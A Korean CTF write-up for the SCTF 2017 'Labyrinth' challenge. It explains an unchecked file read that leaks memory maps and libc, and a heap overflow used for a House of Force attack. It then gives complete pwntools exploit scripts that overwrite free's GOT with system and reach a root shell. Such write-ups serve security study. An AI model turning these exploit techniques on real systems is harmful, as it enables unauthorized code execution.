# [2017_SCTF] \[PWN] Labyrinth

### 환경

```
[*] '/root/labs/ctf/sctf2017/Labyrinth/labyrinth'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



### 문제 이해

```
Welcome to labyrinth management program
1. make_labyrinth
2. do_labyrinth
3. show_info
4. exit
> 
```

미로 게임 입니다.

1번 메뉴는 정보를 입력하여 미로를 만드는 기능이고, 2번 메뉴는 사용자의 입력을 받아 미로를 푸는 기능입니다. 3번 메뉴는 미로의 정보를 보여주는 기능입니다.

1번 메뉴를 통해 미로를 만들면 key를 이름으로 사용하는 파일을 만들고 그 안에 내용을 적습니다. 3번 메뉴를 통해 정보를 읽어올 때에도 파일을 읽어오는 식으로 작동합니다.



### 취약점1 - Memory/File Leakage

```c
int show_1182()
{
  int result; // eax@7
  char ptr; // [sp+7h] [bp-111h]@3
  FILE *stream; // [sp+8h] [bp-110h]@1
  char s; // [sp+Ch] [bp-10Ch]@1
  int v4; // [sp+10Ch] [bp-Ch]@1

  v4 = *MK_FP(__GS__, 20);
  printf("KEY>");
  memset(&s, 0, 0x100u);
  input_D15_(&s, 255, 10);
  stream = fopen(&s, "r");                      // possible to leak any files in the server if you know name of files
  if ( stream )
  {
    while ( !feof(stream) )
    {
      fread(&ptr, 1u, 1u, stream);
      putchar(ptr);
    }
    fclose(stream);
  }
  else
  {
    puts("Nope:)");
  }
  result = *MK_FP(__GS__, 20) ^ v4;
  if ( *MK_FP(__GS__, 20) != v4 )
    sub_1EB0();
  return result;
}
```

사용자로부터 key를 입력받아서 파일을 읽어오는데, 사용자의 입력을 검증하지 않기 때문에 서버 내의 파일을 모두 읽어올 수 있습니다. 읽어올 수 있는 파일 중에서 우리에게 유용한 파일은 /proc/self/maps입니다. 이 파일은 다음과 같이 현재 실행 중인 프로세스의 메모리 정보를 보여줍니다.

```
root@inj3ct:~/labs/ctf/sctf2017/Labyrinth# ./labyrinth
Welcome to labyrinth management program
1. make_labyrinth
2. do_labyrinth
3. show_info
4. exit
> 3
KEY>/proc/self/maps
56555000-56558000 r-xp 00000000 fc:00 531836                             /root/labs/ctf/sctf2017/Labyrinth/labyrinth
56558000-56559000 r--p 00002000 fc:00 531836                             /root/labs/ctf/sctf2017/Labyrinth/labyrinth
56559000-5655a000 rw-p 00003000 fc:00 531836                             /root/labs/ctf/sctf2017/Labyrinth/labyrinth
5655a000-5657b000 rw-p 00000000 00:00 0                                  [heap]
f7e11000-f7fc1000 r-xp 00000000 fc:00 938768                             /lib/i386-linux-gnu/libc-2.23.so
f7fc1000-f7fc3000 r--p 001af000 fc:00 938768                             /lib/i386-linux-gnu/libc-2.23.so
f7fc3000-f7fc4000 rw-p 001b1000 fc:00 938768                             /lib/i386-linux-gnu/libc-2.23.so
f7fc4000-f7fc7000 rw-p 00000000 00:00 0 
f7fd4000-f7fd6000 rw-p 00000000 00:00 0 
f7fd6000-f7fd8000 r--p 00000000 00:00 0                                  [vvar]
f7fd8000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
f7fd9000-f7ffb000 r-xp 00000000 fc:00 938747                             /lib/i386-linux-gnu/ld-2.23.so
f7ffb000-f7ffc000 rw-p 00000000 00:00 0 
f7ffc000-f7ffd000 r--p 00022000 fc:00 938747                             /lib/i386-linux-gnu/ld-2.23.so
f7ffd000-f7ffe000 rw-p 00023000 fc:00 938747                             /lib/i386-linux-gnu/ld-2.23.so
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
```

이를 통해 메모리 정보를 얻어올 수 있습니다. 메모리 정보를 읽어온 후에는 libc 파일도 읽어서 libc를 leak할 수 있습니다.



### 취약점2 - Heap Overflow

```c
signed int __cdecl readSetting_1290(void **a1, const char *a2, _DWORD *width, size_t *height, _DWORD *a5, _DWORD *a6)
{
  void **v6; // esi@3
  signed int result; // eax@11
  char ptr; // [sp+2Bh] [bp-31Dh]@3
  int i; // [sp+2Ch] [bp-31Ch]@2
  int j; // [sp+30h] [bp-318h]@3
  FILE *stream; // [sp+34h] [bp-314h]@1
  char *v12; // [sp+38h] [bp-310h]@2
  char name; // [sp+3Ch] [bp-30Ch]@2
  char email; // [sp+13Ch] [bp-20Ch]@2
  char info; // [sp+23Ch] [bp-10Ch]@2
  int v16; // [sp+33Ch] [bp-Ch]@1

  v16 = *MK_FP(__GS__, 20);
  stream = fopen(a2, "r");
  if ( stream )
  {
    __isoc99_fscanf(stream, "%s %s %d %d %s\n", &name, &email, width, height, &info);
    printf("You will play %s's laby!\n", &name);
    *a1 = calloc(4u, *height);
    v12 = *a1;
    for ( i = 0; *height > i; ++i )
    {
      v6 = &v12[4 * i];
      *v6 = calloc(1u, *width + 1);
      ptr = 0;
      for ( j = 0; !feof(stream); ++j )
      {
        fread(&ptr, 1u, 1u, stream);
        if ( ptr == '\n' )
          break;
        if ( ptr == 'S' )
        {
          *a5 = j;
          *a6 = i;
        }
        *(j + *&v12[4 * i]) = ptr;
      }
    }
    fclose(stream);
    result = 1;
  }
  else
  {
    result = 0;
  }
  if ( *MK_FP(__GS__, 20) != v16 )
    sub_1EB0();
  return result;
}
```

2번 메뉴의 do labyrinth 기능을 실행시키면 key를 입력받은 후, 파일을 읽어서 미로의 정보를 불러옵니다. 주목해야 할 부분은 두가지 입니다. `width의 길이만큼 읽어오는 것이 아니라 줄바꿈 문자가 입력될 때까지 사용자의 입력을 받는다는 점`과 `끝에 줄바꿈 문자 대신 공백을 넣는 트릭으로 fscanf 함수를 속일 수 있다는 점`입니다.

```
name email 1 1 info ES???????????????


```

예를 들어 위와 같은 파일을 읽어와서 코드가 수행되면 height와 width만큼 힙이 할당되고, 힙에 `ES???????????????`가 1바이트씩 들어가게 되면서 오버플로우가 발생합니다. (이런 트릭을 이용하는 이유는 make labyrinth 기능을 수행할 때는 줄바꿈 후 크기가 검증되기 때문입니다.)

이 방식을 이용하여 아래와 같이 topchunk를 덮음으로써 House of Force 공격을 수행할 수 있습니다.

```
Top Chunk: 0x5655b188
Last Remainder: 0

x/4x 0x5655b188
0x5655b188:	0xffffffff	0xffffffff	0x9950afff	0xbc87fd8d
```



### Exploit

```python
from pwn import *

p = process("./labyrinth_patched")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline("/proc/self/maps")

codebase = int(p.recvuntil("-")[:-1],16)
p.recvuntil("[heap]\x0a")
libcbase = int(p.recvuntil("-")[:-1],16)
p.recvuntil("/")
libcname = "/"+p.recvline()[:-1]
print hex(codebase)
print hex(libcbase)
print libcname
p.close()

p = process("./labyrinth_patched")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline(libcname)

f = open("libc", "wb")
while True:
	libc = p.recv()
	f.write(libc)
	if "1. make_labyrinth" in libc:
		break
f.close()
p.interactive()
```

libc 파일을 leak한 후 exploit합니다.



```python
from pwn import *


e = ELF("libc")
p = process("./labyrinth_patched")
print p.recv()
p.sendline("3")			# leak
print p.recv()
p.sendline("/proc/self/maps")
codebase = int(p.recvuntil("-")[:-1],16)
p.recvline()
p.recvline()
p.recvline()
heapbase = int(p.recvuntil("-")[:-1],16)
p.recvuntil("[heap]\x0a")
libcbase = int(p.recvuntil("-")[:-1],16)
p.recvuntil("\x0a\x0a")
log.info("code base = " + hex(codebase))
log.info("heap base = " + hex(heapbase))
log.info("libc base = " + hex(libcbase))
system = libcbase + e.symbols['system']

print p.recv()
p.sendline("1")			# make
print p.recv()
p.sendline("name")
print p.recv()
p.sendline("email")
print p.recv()
p.sendline("1")			# width
print p.recv()
p.sendline("1")			# height
print p.recv()
payload = "info ES"
payload += "\xff"*15		# set top chunk size to 0xffffffff
payload = payload.ljust(255,"\x00")
p.sendline(payload)
p.sendline("a")
print p.recvuntil("SAVE_KEY is ")
key = p.recvuntil("\x0a")[:-1]
print key
p.sendline("2")			# do
print p.recv()
p.sendline(key)
print p.recv()
p.sendline("A")

free_got = codebase + 0x4018
topAddr = heapbase + 0x1188 + 0x8
targetAddr = free_got

print p.recv()			# adjust offset
p.sendline(str(targetAddr - 8 - topAddr - 1))

payload=p32(system)
print p.recv()			# got overwrite
p.sendline(str(0x2000))
print p.recv()
p.sendline(payload+";/bin/sh\x00")
p.interactive()
```



### 결과

```
root@inj3ct:~/labs/ctf/sctf2017/Labyrinth# python ex.py
[*] '/root/labs/ctf/sctf2017/Labyrinth/libc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './labyrinth_patched': pid 8517
Welcome to labyrinth management program
1. make_labyrinth
2. do_labyrinth
3. show_info
4. exit
> 
KEY>
[*] code base = 0x56555000
[*] heap base = 0x5655a000
[*] libc base = 0xf7e11000
1. make_labyrinth
2. do_labyrinth
3. show_info
4. exit
> 
NAME> 
EMAIL> 
WIDTH> 
HEIGHT> 
INFO> 
SAVE_KEY is 
W4DOC3cft41SdRbQU9Nw822icxU3hYECRHSpPhZ1plsXVKbY4YJ14BdfRL2LODFA
1. make_labyrinth
2. do_labyrinth
3. show_info
4. exit
> UNKNOWN OPTION.
1. make_labyrinth
2. do_labyrinth
3. show_info
4. exit
> 
KEY>You will play name's laby!

######
##[]##
######

Wow you're solver!!!
Mame length>
name>Comments Length>
comment> 
[*] Switching to interactive mode
==== Solver ====
1. \xff        \xbe<\xfeԉ??,K\x1c\x9e\x0f\xbc&\x99?<ْ\xbcNL\xae???x\xb2 \xa0\xsh: 1: \xa0\xbd??: not found
$ id
uid=0(root) gid=0(root) groups=0(root)
$  
```

